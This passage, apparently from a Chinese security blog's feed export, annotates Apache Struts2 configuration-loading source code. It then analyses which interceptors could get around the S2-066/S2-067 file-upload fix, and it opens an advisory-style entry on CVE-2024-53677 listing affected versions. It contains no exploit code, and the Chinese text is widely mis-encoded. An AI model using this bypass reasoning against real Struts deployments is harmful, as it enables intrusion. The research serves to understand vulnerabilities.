first.</span></span><br><span class="line">addInjectors(clazz.getSuperclass(), injectors);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO (crazybob): Filter out overridden members.</span></span><br><span class="line">        <span class="comment">// è·å–å­—æ®µæ³¨å…¥å™¨</span></span><br><span class="line">addInjectorsForFields(clazz.getDeclaredFields(), <span class="literal">false</span>, injectors);</span><br><span class="line"><span class="comment">// è·å–æ–¹æ³•æ³¨å…¥å™¨</span></span><br><span class="line">addInjectorsForMethods(clazz.getDeclaredMethods(), <span class="literal">false</span>, injectors);</span><br><span class="line">&#125;       </span><br><span class="line"><span class="comment">// æ³¨å…¥å™¨ä¼šé€šè¿‡åå°„çš„æ–¹å¼å»è®¾ç½®beanå¯¹è±¡çš„å­—æ®µä»¥åŠæ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<h3 id="struts-xml-packageå¤„ç†"><a href="#struts-xml-packageå¤„ç†" class="headerlink" title="struts.xml packageå¤„ç†"></a>struts.xml packageå¤„ç†</h3><p>å¯¹packageçš„å¤„ç†å®é™…ä¸Šä¹Ÿå°±æ˜¯å¯¹actionçš„å¤„ç†ï¼Œé€šè¿‡StutsXmlCOnfigurationProviderçš„loadPackagesæ–¹æ³•æ¥è¿›è¡Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadPackages</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ActionContext</span> <span class="variable">ctx</span> <span class="operator">=</span> ActionContext.getContext();</span><br><span class="line">        ctx.put(reloadKey, Boolean.TRUE);</span><br><span class="line">        <span class="comment">// è°ƒç”¨çˆ¶ç±»æ–¹æ³•</span></span><br><span class="line">        <span class="built_in">super</span>.loadPackages();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadPackages</span><span class="params">()</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        List&lt;Element&gt; reloads = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Element&gt;();</span><br><span class="line">        verifyPackageStructure();</span><br><span class="line">        <span class="comment">// strutsæ ‡ç­¾ä¸‹çš„å†…å®¹</span></span><br><span class="line">        <span class="keyword">for</span> (Document doc : documents) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">        <span class="comment">// è·å–æ‰€æœ‰å­æ ‡ç­¾</span></span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> rootElement.getChildNodes();</span><br><span class="line">        <span class="type">int</span> <span class="variable">childSize</span> <span class="operator">=</span> children.getLength();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; childSize; i++) &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">childNode</span> <span class="operator">=</span> children.item(i);</span><br><span class="line">        <span class="comment">// å¦‚æœæ—¶å…ƒç´ æ ‡ç­¾</span></span><br><span class="line">        <span class="keyword">if</span> (childNode <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">child</span> <span class="operator">=</span> (Element) childNode;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> child.getNodeName();</span><br><span class="line">        <span class="comment">// å¦‚æœèŠ‚ç‚¹åä¸º package</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;package&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">            <span class="comment">// å‘é…ç½®ç±»ä¸­æ·»åŠ  packageConfig</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> addPackage(child);</span><br><span class="line">        <span class="keyword">if</span> (cfg.isNeedsRefresh()) &#123;</span><br><span class="line">        reloads.add(child);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ç”¨æˆ·å¯é›†æˆstrutsConfigurationProvider é‡å†™ loadExtraConfigurationæ–¹æ³• å®ç°æ‰©å±•çš„åŠŸèƒ½ ä¸»è¦æ—¶å¯¹struts.xmlç­‰æ–‡ä»¶çš„è§£æ å¦‚å¢åŠ æ–°çš„æ ‡ç­¾ç­‰  ã€‚ã€‚ã€‚ã€‚</span></span><br><span class="line">        loadExtraConfiguration(doc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (reloads.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        reloadRequiredPackages(reloads);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// é‡å¤è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">for</span> (Document doc : documents) &#123;</span><br><span class="line">        loadExtraConfiguration(doc);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        documents.clear();</span><br><span class="line">        declaredPackages.clear();</span><br><span class="line">        configuration = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">protected</span> PackageConfig <span class="title function_">addPackage</span><span class="params">(Element packageElement)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">    <span class="comment">// è·å–package name</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">packageName</span> <span class="operator">=</span> packageElement.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// configguration ä¸­å­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„åŒ…é…ç½®åä¸ºstruts-default</span></span><br><span class="line">        <span class="comment">// æˆ‘ä»¬é…ç½®çš„åŒ…åä¸º default  ç°åœ¨è¿˜æ²¡æœ‰è¢«åˆ›å»º</span></span><br><span class="line">        <span class="comment">// å¦‚æœæˆ‘ä»¬å°†æˆ‘ä»¬çš„åŒ…åè®¾ç½®ä¸º struts-default åˆ™ä¼šå¯¼è‡´æˆ‘ä»¬çš„åŒ…çš„å†…å®¹æ— æ•ˆ</span></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">packageConfig</span> <span class="operator">=</span> configuration.getPackageConfig(packageName);</span><br><span class="line">        <span class="keyword">if</span> (packageConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">        LOG.debug(<span class="string">&quot;Package [&#123;&#125;] already loaded, skipping re-loading it and using existing PackageConfig [&#123;&#125;]&quot;</span>, packageName, packageConfig);</span><br><span class="line">        <span class="keyword">return</span> packageConfig;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åˆ›å»ºåŒ…é…ç½®æ„å»ºå™¨</span></span><br><span class="line">        PackageConfig.<span class="type">Builder</span> <span class="variable">newPackage</span> <span class="operator">=</span> buildPackageContext(packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (newPackage.isNeedsRefresh()) &#123;</span><br><span class="line">        <span class="keyword">return</span> newPackage.build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        LOG.debug(<span class="string">&quot;Loaded &#123;&#125;&quot;</span>, newPackage);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// add result types (and default result) to this package</span></span><br><span class="line">        <span class="comment">// è§£æ result-typeæ ‡ç­¾ </span></span><br><span class="line">        addResultTypes(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the interceptors and interceptor stacks for this package</span></span><br><span class="line">        <span class="comment">// åŠ è½½æ‹¦æˆªå™¨ ä»¥åŠæ‹¦æˆªå™¨æ ˆ</span></span><br><span class="line">        <span class="comment">// æ‹¦æˆªå™¨é€šè¿‡ interceptor æ ‡ç­¾æŒ‡å®š  è¢«è§£æä¸ºæ‹¦æˆªå™¨é…ç½® æ·»åŠ åˆ°æ‹¦æˆªå™¨é…ç½®åˆ—è¡¨ä¸­</span></span><br><span class="line">        <span class="comment">// åŒ…æ‹¦æˆªå™¨ç”Ÿæ•ˆéœ€è¦é€šè¿‡ åŒ…æ‹¦æˆªå™¨æ ˆæ¥é…ç½®  é€šè¿‡ interceptor-stack æ ‡ç­¾ä¸‹çš„interceptor-refæ¥æŒ‡å®š</span></span><br><span class="line">        <span class="comment">// æ‹¦æˆªå™¨æ ˆå¯ä»¥æœ‰å¤šä¸ª é€šè¿‡ä¸åŒçš„åå­—åŒºåˆ† å’Œæ‹¦æˆªå™¨é…ç½®ä¸€èµ·è¢«æ·»åŠ åˆ°æ‹¦æˆªå™¨é…ç½®åˆ—è¡¨ä¸­</span></span><br><span class="line">        <span class="comment">// ä¸åŒçš„actionå¯ä»¥å¼•ç”¨ä¸åŒçš„æ‹¦æˆªå™¨æˆ–è€…æ‹¦æˆªå™¨æ ˆ</span></span><br><span class="line">        <span class="comment">// æ‹¦æˆªå™¨æ ˆç±»ä¼¼äºç»„çš„æ¦‚å¿µ è¡¨ç¤ºä¸€ç»„æ‹¦æˆªå™¨</span></span><br><span class="line">        loadInterceptors(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the default interceptor reference for this package</span></span><br><span class="line">        <span class="comment">// åŠ è½½é»˜è®¤æ‹¦æˆªå™¨å¼•ç”¨ é€šè¿‡default-interpretor-refæ ‡ç­¾æŒ‡å®š</span></span><br><span class="line">        <span class="comment">// å¯¹åŒ…çš„æ‰€æœ‰actionéƒ½æœ‰æ•ˆ?</span></span><br><span class="line">        loadDefaultInterceptorRef(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the default class ref for this package</span></span><br><span class="line">        <span class="comment">// åŠ è½½é»˜è®¤ç±»å¼•ç”¨  é€šè¿‡ default-class-refæ ‡ç­¾æŒ‡å®š </span></span><br><span class="line">        <span class="comment">// å½“æŸäº›æ ‡ç­¾çš„classå±æ€§æ²¡æœ‰è¢«æŒ‡å®šçš„æ—¶å€™å°±æ˜¯ä½¿ç”¨è¯¥æ ‡ç­¾æŒ‡å®šçš„class</span></span><br><span class="line">        loadDefaultClassRef(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the global result list for this package</span></span><br><span class="line">        <span class="comment">// åŠ è½½å…¨å±€ç»“æœå¤„ç†</span></span><br><span class="line">        <span class="comment">// actionæ‰§è¡Œå®Œåçš„è¡Œä¸º  é»˜è®¤è¡Œä¸ºå—ï¼Ÿ</span></span><br><span class="line">        loadGlobalResults(newPackage, packageElement);</span><br><span class="line">        <span class="comment">// å…è®¸è°ƒç”¨çš„actionæ–¹æ³• </span></span><br><span class="line">        <span class="comment">// å¦‚æœä¸é…ç½® é‚£ä¹ˆæ‰€æœ‰çš„ public cationæ–¹æ³•å‡å¯ä»¥è¢«è°ƒç”¨</span></span><br><span class="line">        loadGlobalAllowedMethods(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the global exception handler list for this package</span></span><br><span class="line">        <span class="comment">// å®šä¹‰å…¨å±€å¼‚å¸¸æ˜ å°„ç»“æœ</span></span><br><span class="line">        loadGlobalExceptionMappings(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get actions</span></span><br><span class="line">        <span class="comment">// actionèŠ‚ç‚¹å¤„ç†</span></span><br><span class="line">        <span class="type">NodeList</span> <span class="variable">actionList</span> <span class="operator">=</span> packageElement.getElementsByTagName(<span class="string">&quot;action&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; actionList.getLength(); i++) &#123;</span><br><span class="line">        <span class="type">Element</span> <span class="variable">actionElement</span> <span class="operator">=</span> (Element) actionList.item(i);</span><br><span class="line">        <span class="comment">// åˆ›å»ºactioné…ç½®</span></span><br><span class="line">        addAction(actionElement, newPackage);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the default action reference for this package</span></span><br><span class="line">        <span class="comment">// é»˜è®¤actionå¼•ç”¨   å½“ç”¨æˆ·è®¿é—®è¯¥å‘½åç©ºé—´ä½†æ²¡æœ‰æŒ‡å®šå…·ä½“çš„actionçš„æ—¶å€™å°†è°ƒç”¨é»˜è®¤çš„action</span></span><br><span class="line">        loadDefaultActionRef(newPackage, packageElement);</span><br><span class="line"></span><br><span class="line">        <span class="type">PackageConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> newPackage.build();</span><br><span class="line">        configuration.addPackageConfig(cfg.getName(), cfg);</span><br><span class="line">        <span class="keyword">return</span> cfg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> PackageConfig.Builder <span class="title function_">buildPackageContext</span><span class="params">(Element packageElement)</span> &#123;</span><br><span class="line">    <span class="comment">// extendsä¸º struts-default å³é»˜è®¤å­˜åœ¨çš„ä¸€ä¸ªåŒ…é…ç½®  ä½œä¸º å½“å‰åŒ…é…ç½®çš„çˆ¶äº²</span></span><br><span class="line">        <span class="comment">// çˆ¶é…ç½®å¯ä»¥æœ‰å¤šä¸ª é€šè¿‡éƒ½å¥½åˆ†å‰²  å­—ç¬¦ä¸²ä¸­è¶Šé åçš„çˆ¶åŒ… è¢«æ’å…¥åˆ°å½“å‰åŒ…é…ç½®çš„çˆ¶åŒ…åˆ—è¡¨çš„ç¬¬ä¸€ä¸ª</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">parent</span> <span class="operator">=</span> packageElement.getAttribute(<span class="string">&quot;extends&quot;</span>);</span><br><span class="line">        <span class="comment">// æ˜¯å¦æ—¶æŠ½è±¡çš„</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">abstractVal</span> <span class="operator">=</span> packageElement.getAttribute(<span class="string">&quot;abstract&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isAbstract</span> <span class="operator">=</span> Boolean.parseBoolean(abstractVal);</span><br><span class="line">        <span class="comment">// è·å–åŒ…å</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> StringUtils.defaultString(packageElement.getAttribute(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">        <span class="comment">// è·å–åŒ…å‘½åç©ºé—´</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">namespace</span> <span class="operator">=</span> StringUtils.defaultString(packageElement.getAttribute(<span class="string">&quot;namespace&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strict DMI is enabled by default, it can disabled by user</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">strictDMI</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// æ˜¯å¦å¯ç”¨ä¸¥æ ¼æ–¹æ³•è°ƒç”¨ é»˜è®¤ä¸ºtrue</span></span><br><span class="line">        <span class="keyword">if</span> (packageElement.hasAttribute(<span class="string">&quot;strict-method-invocation&quot;</span>)) &#123;</span><br><span class="line">        strictDMI = Boolean.parseBoolean(packageElement.getAttribute(<span class="string">&quot;strict-method-invocation&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// åˆ›å»ºåŒ…é…ç½®å…¶æ„å»ºå™¨ å¹¶è®¾ç½®ä¸€äº›å±æ€§</span></span><br><span class="line">        PackageConfig.<span class="type">Builder</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PackageConfig</span>.Builder(name)</span><br><span class="line">        .namespace(namespace)</span><br><span class="line">        .isAbstract(isAbstract)</span><br><span class="line">        .strictMethodInvocation(strictDMI)</span><br><span class="line">        .location(DomHelper.getLocationObject(packageElement));</span><br><span class="line">        <span class="comment">// è·å–çˆ¶åŒ…é…ç½®</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isNotEmpty(StringUtils.defaultString(parent))) &#123; <span class="comment">// has parents, let&#x27;s look it up</span></span><br><span class="line">        List&lt;PackageConfig&gt; parents = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String parentPackageName : ConfigurationUtil.buildParentListFromString(parent)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (configuration.getPackageConfigNames().contains(parentPackageName)) &#123;</span><br><span class="line">        parents.add(configuration.getPackageConfig(parentPackageName));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (declaredPackages.containsKey(parentPackageName)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (configuration.getPackageConfig(parentPackageName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        addPackage(declaredPackages.get(parentPackageName));</span><br><span class="line">        &#125;</span><br><span class="line">        parents.add(configuration.getPackageConfig(parentPackageName));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Parent package is not defined: &quot;</span> + parentPackageName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parents.size() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        cfg.needsRefresh(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// å°†çˆ¶åŒ…é…ç½®æ·»åŠ åˆ°å½“å‰åŒ…é…ç½®ä¸­</span></span><br><span class="line">        cfg.addParents(parents);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> cfg;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addAction</span><span class="params">(Element actionElement, PackageConfig.Builder packageContext)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> actionElement.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> actionElement.getAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">        <span class="comment">//methodName should be null if it&#x27;s not set</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> StringUtils.trimToNull(actionElement.getAttribute(<span class="string">&quot;method&quot;</span>));</span><br><span class="line">        <span class="type">Location</span> <span class="variable">location</span> <span class="operator">=</span> DomHelper.getLocationObject(actionElement);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (location == <span class="literal">null</span>) &#123;</span><br><span class="line">        LOG.warn(<span class="string">&quot;Location null for &#123;&#125;&quot;</span>, className);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if there isn&#x27;t a class name specified for an &lt;action/&gt; then try to</span></span><br><span class="line">        <span class="comment">// use the default-class-ref from the &lt;package/&gt;</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(className)) &#123;</span><br><span class="line">        <span class="comment">// if there is a package default-class-ref use that, otherwise use action support</span></span><br><span class="line">           <span class="comment">/* if (StringUtils.isNotEmpty(packageContext.getDefaultClassRef())) &#123;</span></span><br><span class="line"><span class="comment">                className = packageContext.getDefaultClassRef();</span></span><br><span class="line"><span class="comment">            &#125; else &#123;</span></span><br><span class="line"><span class="comment">                className = ActionSupport.class.getName();</span></span><br><span class="line"><span class="comment">            &#125;*/</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ ¡éªŒcationæ˜¯å¦å­˜åœ¨ æ˜¯å¦å¯è®¿é—®</span></span><br><span class="line">        <span class="keyword">if</span> (!verifyAction(className, name, location)) &#123;</span><br><span class="line">        LOG.error(<span class="string">&quot;Unable to verify action [&#123;&#125;] with class [&#123;&#125;], from [&#123;&#125;]&quot;</span>, name, className, location);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, ResultConfig&gt; results;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// actionå¤„ç†å®Œæˆåçš„è¡Œä¸º</span></span><br><span class="line">        results = buildResults(actionElement, packageContext);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Error building results for action &quot;</span> + name + <span class="string">&quot; in namespace &quot;</span> + packageContext.getNamespace(), e, actionElement);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ„é€  actionçš„æ‹¦æˆªå™¨åˆ—è¡¨</span></span><br><span class="line">        List&lt;InterceptorMapping&gt; interceptorList = buildInterceptorList(actionElement, packageContext);</span><br><span class="line">        <span class="comment">// æ„é€ actionçš„å¼‚å¸¸å¤„ç†åˆ—è¡¨</span></span><br><span class="line">        List&lt;ExceptionMappingConfig&gt; exceptionMappings = buildExceptionMappings(actionElement, packageContext);</span><br><span class="line">        <span class="comment">// æ„é€ actionå…è®¸è®¿é—®çš„æ–¹æ³•</span></span><br><span class="line">        Set&lt;String&gt; allowedMethods = buildAllowedMethods(actionElement, packageContext);</span><br><span class="line">        <span class="comment">// æ„é€ actionConfig</span></span><br><span class="line">        <span class="type">ActionConfig</span> <span class="variable">actionConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActionConfig</span>.Builder(packageContext.getName(), name, className)</span><br><span class="line">        .methodName(methodName)</span><br><span class="line">        .addResultConfigs(results)</span><br><span class="line">        .addInterceptors(interceptorList)</span><br><span class="line">        .addExceptionMappings(exceptionMappings)</span><br><span class="line">        .addParams(XmlHelper.getParams(actionElement))</span><br><span class="line">        .setStrictMethodInvocation(packageContext.isStrictMethodInvocation())</span><br><span class="line">        .addAllowedMethod(allowedMethods)</span><br><span class="line">        .location(location)</span><br><span class="line">        .build();</span><br><span class="line">        <span class="comment">// é€šè¿‡åç§°å¼•ç”¨actionConfig</span></span><br><span class="line">        <span class="comment">// æ·»åŠ åˆ°åŒ…é…ç½®ä¸­</span></span><br><span class="line">        packageContext.addActionConfig(name, actionConfig);</span><br><span class="line"></span><br><span class="line">        LOG.debug(<span class="string">&quot;Loaded &#123;&#125;&#123;&#125; in &#x27;&#123;&#125;&#x27; package: &#123;&#125;&quot;</span>,</span><br><span class="line">        StringUtils.isNotEmpty(packageContext.getNamespace()) ? (packageContext.getNamespace() + <span class="string">&quot;/&quot;</span>) : <span class="string">&quot;&quot;</span>,</span><br><span class="line">        name, packageContext.getName(), actionConfig);</span><br><span class="line">        &#125;        </span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<h1 id="è¿‡æ»¤å™¨æ‰§è¡Œ"><a href="#è¿‡æ»¤å™¨æ‰§è¡Œ" class="headerlink" title="è¿‡æ»¤å™¨æ‰§è¡Œ"></a>è¿‡æ»¤å™¨æ‰§è¡Œ</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="s2-067-s2-066"><a href="#s2-067-s2-066" class="headerlink" title="s2-067 s2-066"></a>s2-067 s2-066</h1><p>ä¿®å¤æ–¹æ¡ˆæ˜¯åœ¨æ·»åŠ æ–‡ä»¶å‚æ•°æ—¶å…ˆåˆ é™¤å·²ç»å­˜åœ¨çš„å‚æ•°ï¼Œé‚£ä¹ˆå¦‚æœåœ¨æ–‡ä»¶å‚æ•°è¢«æ·»åŠ åå†æ¬¡è¢«æ·»åŠ çš„è¯ å°±ä¼šåˆ é™¤ä¹‹å‰çš„å‚æ•°å†æ¬¡è®¾ç½®æ–°çš„å‚æ•°ï¼Œ<br>è¦è¾¾æˆè¿™ä¸ªæ¡ä»¶éœ€è¦æ»¡è¶³è¿™ä¸ªæ‹¦æˆªå™¨åœ¨ FileUploadIntercetoræ‹¦æˆªå™¨åæ‰§è¡ŒappendAllæ–¹æ³•ï¼Œ<br>ç¬¦åˆæ¡ä»¶çš„æ‹¦æˆªå™¨å­˜åœ¨ä¸”è°ƒç”¨äº†appendAllæ–¹æ³•  ä¸è¿‡è®¾ç½®çš„å‚æ•°ä¸æ˜¯æˆ‘æƒ³è¦çš„ã€‚<br>æ¯”å¦‚åœ¨ checkboxæ‹¦æˆªå™¨ä¸­æ’å…¥çš„å€¼ä¸ºfalse æ˜¯å›ºå®šçš„  ç”¨æˆ·æ²¡æ³•æ§åˆ¶<br>datetimeä¸­æ’å…¥çš„å€¼ä¸ºDateç±»å‹  ç±»å‹ä¸åŒ¹é…æ’å…¥ä¼šå¤±è´¥<br>multiselect æ‹¦æˆªå™¨ä¸­æ’å…¥çš„æ˜¯ä¸€ä¸ªç©ºçš„å­—ç¬¦ä¸²æ•°ç»„ é•¿åº¦ä¸º0 ä¹Ÿæ²¡æ³•æ§åˆ¶<br>staticParams  æ‹¦æˆªå™¨ å¤„ç†é…ç½®ä¸­è®¾ç½®çš„å›ºå®šparams æ— æ³•æ§åˆ¶<br>actionMapping å‚æ•°æ‹¦æˆªå™¨  è´Ÿè´£å°†actionæ ‡ç­¾ä¸­è®¾ç½®çš„å‚æ•°æ·»åŠ åˆ°requestä¸­</p>
]]></content>
      <categories>
        <category>æ¡†æ¶å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Apache Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Struts2 S2-067 ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2024-53677ï¼‰</title>
    <url>/archives/60a726cc.html</url>
    <content><![CDATA[<h1 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h1><p>Apache Strutsæ˜¯ç¾å›½é˜¿å¸•å¥‡ï¼ˆApacheï¼‰åŸºé‡‘ä¼šçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæ˜¯ä¸€å¥—ç”¨äºåˆ›å»ºä¼ä¸šçº§Java Webåº”ç”¨çš„å¼€æºMVCæ¡†æ¶ã€‚<br>Apache Strutsåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆç½‘å®¿è¯„åˆ†ï¼šé«˜å±ã€CVSS 3.0 è¯„åˆ†ï¼š8.1ï¼‰ï¼š<br>æ”»å‡»è€…å¯ä»¥æ“çºµæ–‡ä»¶ä¸Šä¼ å‚æ•°æ¥å®ç°è·¯å¾„éå†ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™å¯èƒ½å¯¼è‡´æ¶æ„æ–‡ä»¶ä¸Šä¼ ã€‚  </p>
<h1 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h1><p>Struts 2.0.0 - 2.3.37ï¼ˆEOLï¼‰<br>Struts 2.5.0 - 2.5.33ï¼ˆEOLï¼‰<br>Struts 6.0.0 - 6.3.0.2  </p>
<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p>åŒ<code>S2-066</code>  </p>
